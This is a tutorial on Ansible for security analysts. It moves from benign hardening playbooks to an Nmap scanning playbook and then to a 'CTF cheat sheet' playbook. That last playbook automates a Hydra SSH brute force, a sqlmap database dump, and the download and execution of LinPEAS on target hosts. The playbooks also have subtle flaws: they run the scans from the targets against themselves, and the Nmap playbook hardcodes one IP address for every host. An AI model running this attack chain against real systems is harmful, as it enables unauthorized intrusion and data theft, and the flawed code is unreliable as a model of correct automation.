### Ansible for Cybersecurity Analysts

**Introduction to Ansible**

Ansible is an open-source automation tool used for configuration management, application deployment, and task automation. It’s agentless, using SSH for communication, which simplifies deployment and management.

**Why Ansible for Cybersecurity?**

1. **Consistency**: Ensures consistent security configurations across all systems.
2. **Compliance**: Automates compliance checks and remediation.
3. **Incident Response**: Automates tasks during security incidents.
4. **Patch Management**: Streamlines the process of applying security patches.

**Core Concepts**

1. **Inventory**: A list of managed nodes (servers). It can be simple text files or dynamic inventories.
2. **Playbook**: A YAML file where tasks are defined.
3. **Module**: A unit of code that Ansible executes. Examples include command, shell, file, yum, apt, etc.
4. **Task**: The unit of action in Ansible, part of a playbook.
5. **Role**: A set of related playbooks, tasks, and variables.

**Getting Started with Ansible**

1. **Installation**:
   ```sh
   sudo apt-get install ansible  # For Debian-based systems
   sudo yum install ansible      # For RHEL-based systems
   ```

2. **Inventory Example**:
```
ini
   [webservers]
   server1.example.com
   server2.example.com

   [dbservers]
   server3.example.com````
```

3. **Basic Playbook Example**:
   ```yaml
   - hosts: webservers
     tasks:
       - name: Ensure Apache is installed
         apt:
           name: apache2
           state: present

       - name: Ensure Apache is running
         service:
           name: apache2
           state: started
           enabled: true
   ```

**Using Ansible for Cybersecurity Tasks**

1. **Ensure Firewall is Configured**:
   ```yaml
   - hosts: all
     tasks:
       - name: Ensure UFW is installed
         apt:
           name: ufw
           state: present

       - name: Configure UFW
         ufw:
           rule: allow
           name: 'OpenSSH'
   ```

2. **Automating Patches**:
   ```yaml
   - hosts: all
     tasks:
       - name: Ensure all packages are up to date
         apt:
           upgrade: dist
   ```

3. **User Management**:
   ```yaml
   - hosts: all
     tasks:
       - name: Ensure user is present
         user:
           name: johndoe
           state: present
           groups: "sudo"
           append: yes
   ```

4. **Compliance Checks**:
   Use roles like [Ansible Lockdown](https://github.com/ansible-lockdown) for implementing security baselines (CIS, STIG).

**Best Practices**

1. **Use Roles**: Modularize playbooks for reuse and clarity.
2. **Version Control**: Use Git to manage your playbooks and inventories.
3. **Testing**: Use tools like Molecule to test your Ansible roles.
4. **Documentation**: Document your playbooks and roles for team collaboration.

**Resources and Documentation**

1. **Official Ansible Documentation**: [docs.ansible.com](https://docs.ansible.com/)
2. **Ansible GitHub Repository**: [github.com/ansible/ansible](https://github.com/ansible/ansible)
3. **Ansible Galaxy**: [galaxy.ansible.com](https://galaxy.ansible.com/) - Repository for sharing Ansible roles.
4. **Learning Platform**: [Ansible for DevOps](https://www.ansiblefordevops.com/) by Jeff Geerling.

**Conclusion**

Ansible is a powerful tool for cybersecurity analysts, helping automate and enforce security practices across infrastructure. By mastering Ansible, you can enhance your organization's security posture and efficiency.



### Automating Nmap Scans with Ansible

To automate Nmap scans with Ansible, we can create an Ansible playbook that performs the desired scans on specified targets. Ansible allows you to manage and automate tasks across multiple systems, making it a powerful tool for network administration and security auditing.

#### Prerequisites
1. **Ansible Installed:** Ensure Ansible is installed on your control node.
   - Installation: `sudo apt-get install ansible` (for Debian-based systems)
   - Check version: `ansible --version`
2. **Nmap Installed:** Ensure Nmap is installed on the target machines.
   - Installation: `sudo apt-get install nmap` (for Debian-based systems)

#### Ansible Inventory File
Create an inventory file (`hosts.ini`) to define the target hosts.

```ini
[targets]
192.168.1.1
192.168.1.2
192.168.1.3
```

#### Ansible Playbook
Create an Ansible playbook (`nmap_scan.yml`) to automate the Nmap scans.

```yaml
---
- name: Automate Nmap Scans
  hosts: targets
  become: yes
  tasks:
    - name: Install Nmap
      apt:
        name: nmap
        state: present

    - name: Basic Scan
      command: nmap 192.168.1.1
      register: basic_scan_output

    - name: Service Version Detection Scan
      command: nmap -sV 192.168.1.1
      register: version_scan_output

    - name: Aggressive Scan
      command: nmap -A 192.168.1.1
      register: aggressive_scan_output

    - name: Scan All Ports
      command: nmap -p- 192.168.1.1
      register: all_ports_scan_output

    - name: Script Scanning for Vulnerabilities
      command: nmap --script vuln 192.168.1.1
      register: vuln_scan_output

    - name: Save Basic Scan Output
      copy:
        content: "{{ basic_scan_output.stdout }}"
        dest: /tmp/basic_scan_output.txt

    - name: Save Service Version Detection Scan Output
      copy:
        content: "{{ version_scan_output.stdout }}"
        dest: /tmp/version_scan_output.txt

    - name: Save Aggressive Scan Output
      copy:
        content: "{{ aggressive_scan_output.stdout }}"
        dest: /tmp/aggressive_scan_output.txt

    - name: Save All Ports Scan Output
      copy:
        content: "{{ all_ports_scan_output.stdout }}"
        dest: /tmp/all_ports_scan_output.txt

    - name: Save Vulnerability Scan Output
      copy:
        content: "{{ vuln_scan_output.stdout }}"
        dest: /tmp/vuln_scan_output.txt
```

#### Running the Playbook
Execute the playbook using the following command:

```bash
ansible-playbook -i hosts.ini nmap_scan.yml
```

### Explanation of the Playbook
1. **Install Nmap:**
   - Ensures Nmap is installed on the target machines.

2. **Basic Scan:**
   - Performs a basic scan on the target IP and registers the output.

3. **Service Version Detection Scan:**
   - Scans for service versions and registers the output.

4. **Aggressive Scan:**
   - Performs an aggressive scan, including OS detection, version detection, script scanning, and traceroute.

5. **Scan All Ports:**
   - Scans all 65535 ports on the target IP.

6. **Script Scanning for Vulnerabilities:**
   - Uses Nmap scripts to check for common vulnerabilities.

7. **Save Scan Outputs:**
   - Copies the scan output from each task to a file in the `/tmp` directory on the target machine.

### Customizing the Playbook
- **Targets:**
  - Modify the `hosts.ini` file to include the IP addresses or hostnames of the targets you wish to scan.
- **Scan Options:**
  - Adjust the `command` parameters in the playbook to include any additional Nmap flags or options as needed.
- **Output Locations:**
  - Change the `dest` paths in the `copy` tasks to save the scan results to different locations if desired.

### Additional Resources
- **Ansible Documentation:** [Ansible Documentation](https://docs.ansible.com/)
- **Nmap Documentation:** [Nmap Documentation](https://nmap.org/docs.html)
- **Ansible Galaxy:** [Ansible Galaxy](https://galaxy.ansible.com/) (for reusable Ansible roles and collections)

This playbook automates the process of performing various Nmap scans on multiple targets, ensuring consistent and efficient network discovery and security auditing.



## Extensive Ansible Script

### Ansible Playbook for CTF Cheat Sheet Tasks

Below is an Ansible playbook that covers the steps in the CTF cheat sheet, including reconnaissance, enumeration, exploitation, and privilege escalation.

#### Inventory File
Create an inventory file (`hosts.ini`) to define the target hosts.

```ini
[targets]
192.168.1.1
192.168.1.2
192.168.1.3
```

#### Playbook: `ctf_tasks.yml`
```yaml
---
- name: Automate CTF Cheat Sheet Tasks
  hosts: targets
  become: yes
  tasks:
    # Reconnaissance
    - name: Install Reconnaissance Tools
      apt:
        name:
          - nmap
          - nikto
          - dirb
          - dnsutils
        state: present

    - name: Perform Nmap Scan
      command: nmap -sV {{ inventory_hostname }}
      register: nmap_output

    - name: Perform Nikto Scan
      command: nikto -h {{ inventory_hostname }}
      register: nikto_output

    - name: Perform Dirb Scan
      command: dirb http://{{ inventory_hostname }}
      register: dirb_output

    - name: Perform DNS Lookup
      command: nslookup {{ inventory_hostname }}
      register: dns_output

    - name: Save Reconnaissance Outputs
      copy:
        content: |
          Nmap Output:
          {{ nmap_output.stdout }}
          
          Nikto Output:
          {{ nikto_output.stdout }}
          
          Dirb Output:
          {{ dirb_output.stdout }}
          
          DNS Lookup Output:
          {{ dns_output.stdout }}
        dest: /tmp/recon_{{ inventory_hostname }}.txt

    # Enumeration
    - name: Install Enumeration Tools
      apt:
        name:
          - netcat
          - hydra
          - smbclient
          - enum4linux
        state: present

    - name: Perform Netcat Banner Grabbing
      command: nc -v -w 3 {{ inventory_hostname }} 80
      register: netcat_output

    - name: Perform Hydra SSH Brute Force
      command: hydra -L users.txt -P passwords.txt {{ inventory_hostname }} ssh
      register: hydra_output

    - name: Perform SMB Enumeration
      command: smbclient -L \\{{ inventory_hostname }}
      register: smb_output

    - name: Perform Enum4linux Enumeration
      command: enum4linux -a {{ inventory_hostname }}
      register: enum4linux_output

    - name: Save Enumeration Outputs
      copy:
        content: |
          Netcat Output:
          {{ netcat_output.stdout }}
          
          Hydra Output:
          {{ hydra_output.stdout }}
          
          SMB Client Output:
          {{ smb_output.stdout }}
          
          Enum4linux Output:
          {{ enum4linux_output.stdout }}
        dest: /tmp/enumeration_{{ inventory_hostname }}.txt

    # Exploitation
    - name: Install Exploitation Tools
      apt:
        name:
          - metasploit-framework
          - sqlmap
          - burpsuite
        state: present

    - name: Perform SQLmap Scan
      command: sqlmap -u "http://{{ inventory_hostname }}/vulnerable.php?id=1" --batch --dump
      register: sqlmap_output

    - name: Save Exploitation Outputs
      copy:
        content: |
          SQLmap Output:
          {{ sqlmap_output.stdout }}
        dest: /tmp/exploitation_{{ inventory_hostname }}.txt

    # Privilege Escalation
    - name: Download LinPEAS Script
      get_url:
        url: https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
        dest: /tmp/linpeas.sh
        mode: '0755'

    - name: Run LinPEAS Script
      command: /tmp/linpeas.sh
      register: linpeas_output

    - name: Save LinPEAS Output
      copy:
        content: "{{ linpeas_output.stdout }}"
        dest: /tmp/linpeas_output_{{ inventory_hostname }}.txt

    - name: Download WinPEAS Script
      get_url:
        url: https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
        dest: /tmp/winPEASx64.exe
        mode: '0755'

    - name: Save WinPEAS Note
      copy:
        content: |
          Note: WinPEAS needs to be executed manually on the target Windows machine.
        dest: /tmp/winpeas_note_{{ inventory_hostname }}.txt

```

### Explanation of the Playbook

1. **Reconnaissance Tasks:**
   - **Install Tools:** Ensures that `nmap`, `nikto`, `dirb`, and `dnsutils` are installed.
   - **Perform Scans:** Executes Nmap, Nikto, Dirb, and DNS lookup commands.
   - **Save Outputs:** Collects and saves the output of the reconnaissance tasks to a text file.

2. **Enumeration Tasks:**
   - **Install Tools:** Ensures that `netcat`, `hydra`, `smbclient`, and `enum4linux` are installed.
   - **Perform Enumeration:** Executes banner grabbing with Netcat, brute force with Hydra, SMB enumeration, and Enum4linux.
   - **Save Outputs:** Collects and saves the output of the enumeration tasks to a text file.

3. **Exploitation Tasks:**
   - **Install Tools:** Ensures that `metasploit-framework`, `sqlmap`, and `burpsuite` are installed.
   - **Perform SQLmap Scan:** Executes an SQL injection attack using SQLmap.
   - **Save Outputs:** Collects and saves the output of the exploitation task to a text file.

4. **Privilege Escalation Tasks:**
   - **Download LinPEAS:** Downloads the LinPEAS script for Linux privilege escalation.
   - **Run LinPEAS:** Executes the LinPEAS script and saves the output.
   - **Download WinPEAS:** Downloads the WinPEAS executable for Windows privilege escalation.
   - **Save Note:** Adds a note indicating that WinPEAS needs to be run manually on Windows targets.

### Running the Playbook
Execute the playbook using the following command:
```bash
ansible-playbook -i hosts.ini ctf_tasks.yml
```

### Customizing the Playbook
- **Targets:** Modify the `hosts.ini` file to include the IP addresses or hostnames of the targets you wish to scan.
- **Usernames and Passwords:** Ensure `users.txt` and `passwords.txt` are available for Hydra SSH brute force attacks.
- **Output Locations:** Change the `dest` paths in the `copy` tasks to save the outputs to different locations if desired.

### Additional Resources
- **Ansible Documentation:** [Ansible Documentation](https://docs.ansible.com/)
- **Nmap Documentation:** [Nmap Documentation](https://nmap.org/docs.html)
- **Nikto Documentation:** [Nikto Documentation](https://cirt.net/Nikto2)
- **Dirb Documentation:** [Dirb Documentation](https://tools.kali.org/web-applications/dirb)
- **Hydra Documentation:** [Hydra Documentation](https://tools.kali.org/password-attacks/hydra)
- **Metasploit Documentation:** [Metasploit Documentation](https://docs.rapid7.com/metasploit/)
- **SQLmap Documentation:** [SQLmap Documentation](https://sqlmap.org/)

This playbook automates various steps in a typical CTF challenge, ensuring consistent execution and easy repeatability.